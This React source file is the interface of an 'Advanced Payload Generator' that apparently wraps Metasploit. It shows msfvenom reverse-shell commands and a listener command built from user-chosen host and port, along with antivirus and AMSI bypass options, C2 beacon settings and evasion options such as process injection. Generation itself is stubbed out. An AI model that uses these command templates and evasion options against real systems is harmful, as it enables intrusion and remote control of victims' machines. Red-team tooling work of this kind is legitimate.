
import { useState } from "react";
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Label } from "@/components/ui/label";
import { Input } from "@/components/ui/input";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { ChevronsUpDown, Download, Copy, Code, ListFilter } from "lucide-react";
import { toast } from "sonner";
import { Checkbox } from "@/components/ui/checkbox";

const PayloadGenerator = () => {
  const [payload, setPayload] = useState("windows/meterpreter/reverse_tcp");
  const [lhost, setLhost] = useState("0.0.0.0");
  const [lport, setLport] = useState("4444");
  const [format, setFormat] = useState("exe");
  const [encoding, setEncoding] = useState("none");
  const [generated, setGenerated] = useState(false);
  const [payloadCategory, setPayloadCategory] = useState("standard");
  const [bypassOptions, setBypassOptions] = useState({
    obfuscate: false,
    encrypt: false,
    sandbox: false,
    amsi: false
  });

  // Extended payload options by category
  const payloadOptions = {
    standard: [
      { value: "windows/meterpreter/reverse_tcp", label: "Windows Meterpreter (Reverse TCP)" },
      { value: "windows/meterpreter/reverse_https", label: "Windows Meterpreter (Reverse HTTPS)" },
      { value: "linux/x86/meterpreter/reverse_tcp", label: "Linux x86 Meterpreter (Reverse TCP)" },
      { value: "android/meterpreter/reverse_tcp", label: "Android Meterpreter (Reverse TCP)" },
      { value: "osx/x64/meterpreter/reverse_tcp", label: "macOS x64 Meterpreter (Reverse TCP)" }
    ],
    stageless: [
      { value: "windows/meterpreter_reverse_tcp", label: "Windows Meterpreter Stageless (TCP)" },
      { value: "linux/x64/meterpreter_reverse_tcp", label: "Linux x64 Meterpreter Stageless (TCP)" },
      { value: "osx/x64/meterpreter_reverse_tcp", label: "macOS x64 Meterpreter Stageless (TCP)" }
    ],
    web: [
      { value: "php/meterpreter_reverse_tcp", label: "PHP Meterpreter" },
      { value: "java/jsp_shell_reverse_tcp", label: "JSP Shell" },
      { value: "nodejs/shell_reverse_tcp", label: "NodeJS Shell" },
      { value: "python/meterpreter/reverse_tcp", label: "Python Meterpreter" }
    ],
    custom: [
      { value: "windows/custom/reverse_winhttp", label: "Custom WinHTTP Payload" },
      { value: "windows/custom/reverse_wininet", label: "Custom WinINet Payload" },
      { value: "custom/reverse_dns", label: "Custom DNS Exfiltration Payload" }
    ],
    c2: [
      { value: "windows/meterpreter/reverse_tcp_dns", label: "C2 DNS Tunneling" },
      { value: "windows/meterpreter/reverse_https_proxy", label: "C2 HTTPS with Proxy" },
      { value: "windows/meterpreter/reverse_winhttps", label: "C2 WinHTTPS Protocol" },
      { value: "windows/beacon_https/reverse_https", label: "C2 Beacon HTTPS" }
    ],
    fileless: [
      { value: "windows/powershell_reverse_tcp", label: "PowerShell In-Memory" },
      { value: "windows/exec_shellcode", label: "Shellcode Injection" },
      { value: "windows/reflective_dll_inject", label: "Reflective DLL Injection" }
    ]
  };

  // Output format options by payload type
  const formatOptions = {
    windows: ["exe", "dll", "msi", "powershell", "vbs", "hta", "csharp"],
    linux: ["elf", "bash", "python", "ruby", "perl"],
    web: ["php", "asp", "jsp", "war"],
    mac: ["macho", "dmg", "app", "swift"],
    android: ["apk", "dex", "jar"],
    ios: ["dylib", "framework", "ipa"]
  };

  const handleGenerate = () => {
    toast.info("Payload generation initiated", {
      description: "In a real application, this would generate the actual payload via Python and Metasploit"
    });
    setGenerated(true);
  };

  const handleCopy = () => {
    toast.success("Command copied to clipboard");
  };

  const handleDownload = () => {
    toast.info("This would download the payload in a real application");
  };

  // Determine available formats based on selected payload
  const getAvailableFormats = () => {
    if (payload.includes("windows")) return formatOptions.windows;
    if (payload.includes("linux")) return formatOptions.linux;
    if (payload.includes("osx") || payload.includes("macos")) return formatOptions.mac;
    if (payload.includes("android")) return formatOptions.android;
    if (payload.includes("php") || payload.includes("jsp") || payload.includes("asp")) return formatOptions.web;
    return formatOptions.windows; // Default fallback
  };

  // Generate additional command options based on selected bypass techniques
  const getBypassCommandOptions = () => {
    let options = [];
    
    if (bypassOptions.obfuscate) options.push("--obfuscate");
    if (bypassOptions.encrypt) options.push("--encrypt-payload");
    if (bypassOptions.sandbox) options.push("--sandbox-evasion");
    if (bypassOptions.amsi) options.push("--bypass-amsi");
    
    return options.join(" ");
  };

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <h1 className="text-2xl font-bold">Advanced Payload Generator</h1>
        <Button onClick={handleGenerate} className="bg-blue-600 hover:bg-blue-700">
          Generate Payload
        </Button>
      </div>
      
      <Tabs defaultValue="standard">
        <TabsList className="grid w-full grid-cols-4 bg-zinc-800">
          <TabsTrigger value="standard">Standard</TabsTrigger>
          <TabsTrigger value="encoded">Encoded</TabsTrigger>
          <TabsTrigger value="c2-integration">C2 Integration</TabsTrigger>
          <TabsTrigger value="advanced">Advanced</TabsTrigger>
        </TabsList>
        
        <TabsContent value="standard" className="space-y-4 mt-4">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <Card className="bg-zinc-800 border-zinc-700">
              <CardHeader>
                <CardTitle>Payload Options</CardTitle>
                <CardDescription>Configure your payload settings</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="payload-category">Payload Category</Label>
                  <Select value={payloadCategory} onValueChange={setPayloadCategory}>
                    <SelectTrigger id="payload-category" className="bg-zinc-900 border-zinc-700">
                      <SelectValue placeholder="Select category" />
                    </SelectTrigger>
                    <SelectContent className="bg-zinc-900 border-zinc-700">
                      <SelectItem value="standard">Standard Payloads</SelectItem>
                      <SelectItem value="stageless">Stageless Payloads</SelectItem>
                      <SelectItem value="web">Web Payloads</SelectItem>
                      <SelectItem value="custom">Custom Payloads</SelectItem>
                      <SelectItem value="c2">C2 Optimized Payloads</SelectItem>
                      <SelectItem value="fileless">Fileless Payloads</SelectItem>
                    </SelectContent>
                  </Select>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="payload">Payload Type</Label>
                  <Select value={payload} onValueChange={setPayload}>
                    <SelectTrigger id="payload" className="bg-zinc-900 border-zinc-700">
                      <SelectValue placeholder="Select payload" />
                    </SelectTrigger>
                    <SelectContent className="bg-zinc-900 border-zinc-700 max-h-[300px]">
                      {payloadOptions[payloadCategory as keyof typeof payloadOptions].map((option) => (
                        <SelectItem key={option.value} value={option.value}>
                          {option.label}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="lhost">LHOST (Listener Host)</Label>
                  <Input
                    id="lhost"
                    value={lhost}
                    onChange={(e) => setLhost(e.target.value)}
                    className="bg-zinc-900 border-zinc-700"
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="lport">LPORT (Listener Port)</Label>
                  <Input
                    id="lport"
                    value={lport}
                    onChange={(e) => setLport(e.target.value)}
                    className="bg-zinc-900 border-zinc-700"
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="format">Output Format</Label>
                  <Select value={format} onValueChange={setFormat}>
                    <SelectTrigger id="format" className="bg-zinc-900 border-zinc-700">
                      <SelectValue placeholder="Select format" />
                    </SelectTrigger>
                    <SelectContent className="bg-zinc-900 border-zinc-700">
                      {getAvailableFormats().map((fmt) => (
                        <SelectItem key={fmt} value={fmt}>
                          {fmt.toUpperCase()}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>
                
                <div className="space-y-2">
                  <Label className="text-sm">AV Bypass Options</Label>
                  <div className="space-y-2">
                    <div className="flex items-center space-x-2">
                      <Checkbox 
                        id="obfuscate" 
                        checked={bypassOptions.obfuscate}
                        onCheckedChange={(checked) => 
                          setBypassOptions({...bypassOptions, obfuscate: checked === true})
                        }
                      />
                      <label
                        htmlFor="obfuscate"
                        className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"
                      >
                        Code Obfuscation
                      </label>
                    </div>
                    
                    <div className="flex items-center space-x-2">
                      <Checkbox 
                        id="encrypt" 
                        checked={bypassOptions.encrypt}
                        onCheckedChange={(checked) => 
                          setBypassOptions({...bypassOptions, encrypt: checked === true})
                        }
                      />
                      <label
                        htmlFor="encrypt"
                        className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"
                      >
                        Encrypt Payload
                      </label>
                    </div>
                    
                    <div className="flex items-center space-x-2">
                      <Checkbox 
                        id="sandbox" 
                        checked={bypassOptions.sandbox}
                        onCheckedChange={(checked) => 
                          setBypassOptions({...bypassOptions, sandbox: checked === true})
                        }
                      />
                      <label
                        htmlFor="sandbox"
                        className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"
                      >
                        Sandbox Evasion
                      </label>
                    </div>
                    
                    <div className="flex items-center space-x-2">
                      <Checkbox 
                        id="amsi" 
                        checked={bypassOptions.amsi}
                        onCheckedChange={(checked) => 
                          setBypassOptions({...bypassOptions, amsi: checked === true})
                        }
                      />
                      <label
                        htmlFor="amsi"
                        className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"
                      >
                        AMSI Bypass (Windows)
                      </label>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>
            
            <Card className="bg-zinc-800 border-zinc-700">
              <CardHeader>
                <CardTitle>Output</CardTitle>
                <CardDescription>Generated payload commands and files</CardDescription>
              </CardHeader>
              <CardContent>
                {generated ? (
                  <div className="space-y-4">
                    <div className="space-y-2">
                      <Label>MSF Command</Label>
                      <div className="bg-zinc-900 p-3 rounded-md border border-zinc-700 font-mono text-xs text-green-400 relative">
                        msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {format} {getBypassCommandOptions()} -o payload.{format}
                        <Button 
                          variant="ghost" 
                          size="icon" 
                          className="absolute top-1 right-1 h-6 w-6" 
                          onClick={handleCopy}
                        >
                          <Copy className="h-3 w-3" />
                        </Button>
                      </div>
                    </div>
                    
                    <div className="space-y-2">
                      <Label>Handler Command</Label>
                      <div className="bg-zinc-900 p-3 rounded-md border border-zinc-700 font-mono text-xs text-green-400 relative">
                        use exploit/multi/handler
                        <br/>
                        set PAYLOAD {payload}
                        <br/>
                        set LHOST {lhost}
                        <br/>
                        set LPORT {lport}
                        <br/>
                        exploit -j
                        <Button 
                          variant="ghost" 
                          size="icon" 
                          className="absolute top-1 right-1 h-6 w-6" 
                          onClick={handleCopy}
                        >
                          <Copy className="h-3 w-3" />
                        </Button>
                      </div>
                    </div>
                    
                    <div className="bg-zinc-900 p-3 rounded-md border border-zinc-700">
                      <div className="flex items-center justify-between">
                        <div className="font-mono text-sm">payload.{format}</div>
                        <div className="text-xs text-zinc-400">12 KB</div>
                      </div>
                      <div className="mt-2 flex items-center gap-2">
                        <Button size="sm" variant="outline" className="border-zinc-700 text-xs" onClick={handleDownload}>
                          <Download className="mr-1 h-3 w-3" /> Download
                        </Button>
                        <Button size="sm" variant="outline" className="border-zinc-700 text-xs">
                          <Code className="mr-1 h-3 w-3" /> View Hex
                        </Button>
                      </div>
                    </div>
                  </div>
                ) : (
                  <div className="flex flex-col items-center justify-center h-[320px] text-center">
                    <ChevronsUpDown className="h-12 w-12 text-zinc-500 mb-4" />
                    <h3 className="text-lg font-medium mb-2">No Payload Generated</h3>
                    <p className="text-sm text-zinc-400">
                      Configure your payload options and click on "Generate Payload" to create a new payload.
                    </p>
                  </div>
                )}
              </CardContent>
            </Card>
          </div>
        </TabsContent>
        
        <TabsContent value="encoded" className="mt-4">
          <Card className="bg-zinc-800 border-zinc-700">
            <CardHeader>
              <CardTitle>Payload Encoding Options</CardTitle>
              <CardDescription>Configure encoding to help evade detection</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="encoder">Encoder</Label>
                  <Select value={encoding} onValueChange={setEncoding}>
                    <SelectTrigger id="encoder" className="bg-zinc-900 border-zinc-700">
                      <SelectValue placeholder="Select encoder" />
                    </SelectTrigger>
                    <SelectContent className="bg-zinc-900 border-zinc-700">
                      <SelectItem value="none">None</SelectItem>
                      <SelectItem value="x86/shikata_ga_nai">x86/shikata_ga_nai</SelectItem>
                      <SelectItem value="cmd/powershell_base64">cmd/powershell_base64</SelectItem>
                      <SelectItem value="x64/xor">x64/xor</SelectItem>
                      <SelectItem value="x64/zutto_dekiru">x64/zutto_dekiru</SelectItem>
                      <SelectItem value="cmd/brace">cmd/brace</SelectItem>
                      <SelectItem value="cmd/echo">cmd/echo</SelectItem>
                      <SelectItem value="cmd/perl">cmd/perl</SelectItem>
                      <SelectItem value="cmd/powershell_base64">cmd/powershell_base64</SelectItem>
                      <SelectItem value="cmd/printf_php_mq">cmd/printf_php_mq</SelectItem>
                      <SelectItem value="x86/alpha_mixed">x86/alpha_mixed</SelectItem>
                      <SelectItem value="x86/alpha_upper">x86/alpha_upper</SelectItem>
                      <SelectItem value="x86/avoid_underscore_tolower">x86/avoid_underscore_tolower</SelectItem>
                      <SelectItem value="x86/avoid_utf8_tolower">x86/avoid_utf8_tolower</SelectItem>
                      <SelectItem value="x86/bloxor">x86/bloxor</SelectItem>
                      <SelectItem value="x86/call4_dword_xor">x86/call4_dword_xor</SelectItem>
                      <SelectItem value="x86/context_cpuid">x86/context_cpuid</SelectItem>
                      <SelectItem value="x86/context_stat">x86/context_stat</SelectItem>
                      <SelectItem value="x86/context_time">x86/context_time</SelectItem>
                      <SelectItem value="x86/countdown">x86/countdown</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
                
                <div className="space-y-2">
                  <Label htmlFor="iterations">Encoding Iterations</Label>
                  <Input
                    id="iterations"
                    defaultValue="1"
                    className="bg-zinc-900 border-zinc-700"
                  />
                </div>
              </div>
              
              <div className="space-y-2">
                <Label>Custom Encoder Chain</Label>
                <div className="bg-zinc-900 p-3 rounded-md border border-zinc-700 flex items-center gap-2">
                  <ListFilter className="h-4 w-4 text-zinc-500" />
                  <p className="text-sm text-zinc-400">
                    No encoders in chain. Add encoders to create a multi-encoder chain.
                  </p>
                </div>
              </div>
              
              <div className="bg-zinc-900 p-3 rounded-md border border-zinc-700">
                <p className="text-sm text-zinc-400">
                  Encoding can help bypass basic antivirus detection but may increase payload size. Multiple iterations can improve evasion but may impact stability.
                </p>
              </div>
            </CardContent>
            <CardFooter>
              <Button onClick={handleGenerate} className="bg-blue-600 hover:bg-blue-700">
                Generate Encoded Payload
              </Button>
            </CardFooter>
          </Card>
        </TabsContent>

        <TabsContent value="c2-integration" className="mt-4">
          <Card className="bg-zinc-800 border-zinc-700">
            <CardHeader>
              <CardTitle>C2 Framework Integration</CardTitle>
              <CardDescription>Generate payloads optimized for C2 frameworks</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="c2-framework">C2 Framework</Label>
                  <Select defaultValue="metasploit">
                    <SelectTrigger id="c2-framework" className="bg-zinc-900 border-zinc-700">
                      <SelectValue placeholder="Select C2 framework" />
                    </SelectTrigger>
                    <SelectContent className="bg-zinc-900 border-zinc-700">
                      <SelectItem value="metasploit">Metasploit Framework</SelectItem>
                      <SelectItem value="covenant">Covenant</SelectItem>
                      <SelectItem value="havoc">Havoc C2</SelectItem>
                      <SelectItem value="sliver">Sliver</SelectItem>
                      <SelectItem value="custom">Custom C2</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
                
                <div className="space-y-2">
                  <Label htmlFor="c2-profile">Communication Profile</Label>
                  <Select defaultValue="http">
                    <SelectTrigger id="c2-profile" className="bg-zinc-900 border-zinc-700">
                      <SelectValue placeholder="Select profile" />
                    </SelectTrigger>
                    <SelectContent className="bg-zinc-900 border-zinc-700">
                      <SelectItem value="http">HTTP/S Profile</SelectItem>
                      <SelectItem value="dns">DNS Tunneling</SelectItem>
                      <SelectItem value="smb">SMB Named Pipe</SelectItem>
                      <SelectItem value="tcp">TCP Direct</SelectItem>
                      <SelectItem value="multi">Multi-protocol</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
              </div>

              <div className="space-y-2">
                <Label htmlFor="c2-server">C2 Server Address</Label>
                <Input
                  id="c2-server"
                  placeholder="192.168.1.100 or domain.com"
                  className="bg-zinc-900 border-zinc-700"
                />
              </div>
              
              <div className="space-y-2">
                <Label>Beacon Options</Label>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <Input
                    id="sleep-time"
                    placeholder="Sleep Time (seconds)"
                    defaultValue="60"
                    className="bg-zinc-900 border-zinc-700"
                  />
                  <Input
                    id="jitter"
                    placeholder="Jitter (%)"
                    defaultValue="10"
                    className="bg-zinc-900 border-zinc-700"
                  />
                </div>
              </div>
              
              <div className="space-y-2">
                <div className="flex items-center space-x-2">
                  <Checkbox id="kill-date" />
                  <label
                    htmlFor="kill-date"
                    className="text-sm font-medium leading-none"
                  >
                    Enable Kill Date
                  </label>
                </div>
              </div>
              
              <div className="bg-zinc-900 p-3 rounded-md border border-zinc-700">
                <p className="text-sm text-zinc-400">
                  C2 integration allows for advanced command and control of compromised systems. Beacons provide stealth by controlling check-in times.
                </p>
              </div>
            </CardContent>
            <CardFooter>
              <Button onClick={handleGenerate} className="bg-blue-600 hover:bg-blue-700">
                Generate C2 Payload
              </Button>
            </CardFooter>
          </Card>
        </TabsContent>
        
        <TabsContent value="advanced" className="mt-4">
          <Card className="bg-zinc-800 border-zinc-700">
            <CardHeader>
              <CardTitle>Advanced Options</CardTitle>
              <CardDescription>Fine-tune payload generation with advanced settings</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="space-y-2">
                <Label>Template Injection</Label>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <Select defaultValue="none">
                    <SelectTrigger id="template-type" className="bg-zinc-900 border-zinc-700">
                      <SelectValue placeholder="Select template" />
                    </SelectTrigger>
                    <SelectContent className="bg-zinc-900 border-zinc-700">
                      <SelectItem value="none">No Template</SelectItem>
                      <SelectItem value="pdf">PDF Document</SelectItem>
                      <SelectItem value="doc">Word Document</SelectItem>
                      <SelectItem value="xls">Excel Spreadsheet</SelectItem>
                      <SelectItem value="exe">Legitimate EXE</SelectItem>
                    </SelectContent>
                  </Select>
                  <div>
                    <Input
                      type="file"
                      id="template-file"
                      className="bg-zinc-900 border-zinc-700 hidden"
                    />
                    <Button
                      variant="outline"
                      className="w-full border-zinc-700"
                      onClick={() => document.getElementById("template-file")?.click()}
                    >
                      Choose Template File
                    </Button>
                  </div>
                </div>
              </div>
              
              <div className="space-y-2">
                <Label>Custom Configuration</Label>
                <div className="bg-zinc-900 p-3 rounded-md border border-zinc-700 font-mono text-xs h-32">
                  # Add custom configuration options here
                  # Example: EXITFUNC=thread
                  # Example: PrependMigrate=true
                </div>
              </div>
              
              <div className="space-y-2">
                <Label>Advanced Evasion Techniques</Label>
                <div className="space-y-2">
                  <div className="flex items-center space-x-2">
                    <Checkbox id="process-injection" />
                    <label
                      htmlFor="process-injection"
                      className="text-sm font-medium leading-none"
                    >
                      Process Injection
                    </label>
                  </div>
                  <div className="flex items-center space-x-2">
                    <Checkbox id="syscall-proxying" />
                    <label
                      htmlFor="syscall-proxying"
                      className="text-sm font-medium leading-none"
                    >
                      Syscall Proxying
                    </label>
                  </div>
                  <div className="flex items-center space-x-2">
                    <Checkbox id="sleep-obfuscation" />
                    <label
                      htmlFor="sleep-obfuscation"
                      className="text-sm font-medium leading-none"
                    >
                      Sleep Obfuscation
                    </label>
                  </div>
                  <div className="flex items-center space-x-2">
                    <Checkbox id="unhook-api" />
                    <label
                      htmlFor="unhook-api"
                      className="text-sm font-medium leading-none"
                    >
                      API Unhooking
                    </label>
                  </div>
                </div>
              </div>
            </CardContent>
            <CardFooter>
              <Button onClick={handleGenerate} className="bg-blue-600 hover:bg-blue-700">
                Generate Custom Payload
              </Button>
            </CardFooter>
          </Card>
        </TabsContent>
      </Tabs>
    </div>
  );
};

export default PayloadGenerator;
